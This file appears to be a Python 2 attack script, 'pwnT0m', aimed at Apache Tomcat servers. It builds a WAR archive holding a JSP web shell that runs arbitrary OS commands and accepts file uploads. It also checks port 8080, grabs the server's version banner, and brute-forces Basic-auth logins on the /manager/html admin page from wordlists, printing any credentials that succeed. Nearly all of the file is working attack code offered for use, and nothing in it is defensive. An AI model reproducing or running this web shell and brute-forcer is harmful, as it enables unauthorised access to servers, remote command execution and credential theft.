#!/usr/bin/env python
import socket
import subprocess
import sys
import time
from datetime import datetime
import getopt
import base64
import requests
import os

test=('<%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%><script>eval(window.localStorage.embed)</script><%!public String v(String w){String x="";try{x=URLDecoder.decode(w,"UTF-8");}catch(Exception e){}return x;}%><%String o,l,d;o=l=d="";DataInputStream r=new DataInputStream(request.getInputStream());while((l=r.readLine())!=null){d+=l;}if(d.indexOf("c=")>=0){String g=v(d.substring(2));String s;try{Process p=Runtime.getRuntime().exec(g);DataInputStream i=new DataInputStream(p.getInputStream());out.print("<pre>");while((s=i.readLine())!=null){o+=s.replace("<","&lt;").replace(">","&gt;")+"<br>";}}catch(Exception e){out.print(e);}}else{if(d.length()>1){int b=d.indexOf("b=");int n=d.indexOf("n=");byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));try{OutputStream stream=new FileOutputStream(f);stream.write(m);o="Uploaded: "+f;}catch(Exception e){out.print(e);}}}%><%=o%>')
JSPcode=' <% Runtime.getRuntime().exec(request.getParameter("cmd")); %> '
os.mkdir('tomcat')
shell=open("./tomcat/shell.jsp","w")
shell.write(test)
shell.close()
os.chdir('./tomcat')
os.system('jar -cvf ../webshell.war *')


# Clear the screen
subprocess.call('clear', shell=True)

# Ask for input
remoteServer    = raw_input("Enter a remote host to scan: ")
remoteServerIP  = socket.gethostbyname(remoteServer)
time.sleep(2)

# Print a nice banner with information on which host we are about to scan
print "*" * 60
time.sleep(2)
print "W3lc0me t0 pwnT0m!"
time.sleep(2)
print "Your current working directory is:"+(os.getcwd())
time.sleep(2)
print "Please wait, while we scan remote host for port 8080 on", remoteServerIP
time.sleep(2)
print "*" * 60
time.sleep(2)
# Check what time the scan started
t1 = datetime.now()

# Using the range function to specify ports (here it will scans all ports between 1 and 1024)

# We also put in some error handling for catching error
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect_ex((remoteServerIP, 8080))
	if result == 0:
			print "Port 8080 is Open"
	buff=("GET /tomcat.png HTTP/1.1\nHost: "+remoteServerIP+":8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0)Gecko/20100101 Firefox/60.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://"+remoteServerIP+":8080\nConnection: keep-alive\n\n")
	sock.send(buff)
	data=sock.recv(1024)
	print"Lets try and grab the server version details"
	time.sleep(3)
	print "Please be patient!!"
	time.sleep(3)
	start=data.find("Server")
	end=data.find("Accept")	
	data.split()
	print "The backend "+ data[start:end]
	sock.close()
	time.sleep(2)
	print "*"*30
	print "We will now try brute for the the default admin login page, we would want a decent username and password list to try our best: "
	print "*"*30
	time.sleep(2)
	usr_path=raw_input("Please put the path of the username file\nusr_path: ")
	print usr_path 
	pwd_path= raw_input("Please put the path of the password file\npwd_path: ")
	print pwd_path
	usernames = open(usr_path, 'r').read().splitlines()
    	passwords = open(pwd_path, 'r').read().splitlines()
	for pwd in passwords:
        	for usr in usernames:
            		Authorization=base64.b64encode("%s:%s" % (usr, pwd))
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect_ex((remoteServerIP, 8080))
			auth=("GET /manager/html HTTP/1.1\nHost:" +remoteServerIP+":8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://"+remoteServerIP+":8080/\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nAuthorization: Basic "+Authorization+"\n\n")
			sock.send(auth)
			Resp=sock.recv(100) 
			if Resp.find("200 OK") > 0:
				print "-"*60
				print "In case you wanna manually login,  use the below credentials: "
				print "-"*60
				print "URL: http://"+remoteServerIP+":8080/manager/html"
				print "Username: %s" %usr
				print "Password: %s" %pwd
				
 				sock.close()

			

	
	

except KeyboardInterrupt:
	print "You pressed Ctrl+C"
	sys.exit()

except socket.gaierror:
    print 'Hostname could not be resolved. Exiting'
    sys.exit()

except socket.error:
    print "Couldn't connect to server"
    sys.exit()

# Checking the time again
t2 = datetime.now()

# Calculates the difference of time, to see how long it took to run the script
total =  t2 - t1

# Printing the information to screen
print 'Scanning Completed in: ', total

